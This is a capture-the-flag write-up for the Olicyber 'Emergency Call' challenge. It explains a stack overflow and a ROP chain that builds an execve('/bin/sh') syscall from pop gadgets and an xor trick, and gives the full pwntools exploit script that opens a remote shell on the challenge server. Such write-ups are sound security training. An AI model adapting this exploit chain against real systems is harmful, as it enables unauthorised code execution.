---
title: "Emergency Call — ROP Syscall Chain for execve"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "rop", "syscall", "pwntools"]
difficulty: "intermediate"
summary: "Write /bin/sh into a known writable address, then build a ROP chain that sets rax=59, rdi=/bin/sh, rsi=0, rdx=0 using dedicated pop gadgets and a syscall instruction to get a shell."
---

## The Challenge

No libc, no `system`, no win function. The binary is almost bare-metal: it has a handful of hand-crafted gadgets and a writable data section. The only way out is to call `execve` directly via the Linux syscall interface.

## Approach

The binary has exactly the gadgets needed for a manual `execve` call:

- `0x40102f` — `syscall`
- `0x401032` — `pop rdi; ret`
- `0x401034` — `pop rsi; ret`
- `0x401036` — `pop rdx; ret`
- `0x401038` — `xor rax, rdi; ret`

`execve` needs: `rax = 59`, `rdi = ptr to "/bin/sh"`, `rsi = 0`, `rdx = 0`.

The trick for `rax`: first `pop rdi` loads `59`, then `xor rax, rdi` sets `rax = rax XOR 59`. If `rax` is zero at that point (freshly returned from a prior syscall or zeroed), the result is `59`. Then `pop rdi` is called again to point at the string.

Before the ROP chain fires I send `/bin/sh\x00` to land at `0x404000`, which is a static writable address.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

r = remote("emergency.challs.olicyber.it", 10306)
r.recv(1000)
r.send(b'/bin/sh\x00')

payload = b'a'*40 # buffer

payload += p64(0x401032) # rop : pop rdi
payload += p64(59)

payload += p64(0x401038) # rop : xor rax

payload += p64(0x401032) # rop : pop rdi
payload += p64(0x404000)

payload += p64(0x401034) # rop : pop rsi
payload += p64(0)

payload += p64(0x401036) # rop : pop rdx
payload += p64(0)

payload += p64(0x40102f) # syscall

r.recv(1000)
r.send(payload + b'\x00')
r.interactive()
```

The first `recv + send` writes `"/bin/sh\x00"` to the first data read the binary does. 40 null bytes reach the saved return address. The ROP chain then builds the syscall register state step by step. The final `syscall` executes `execve("/bin/sh", NULL, NULL)` — a shell.

## What I Learned

When there is no libc and no win function, raw syscalls are the path. `xor rax, rdi` as a way to load `rax` avoids needing a dedicated `pop rax; ret` gadget — a common trick when the gadget set is minimal. Knowing the Linux amd64 syscall table (execve = 59) and calling convention (rdi/rsi/rdx order) is required knowledge for bare-metal ROP.
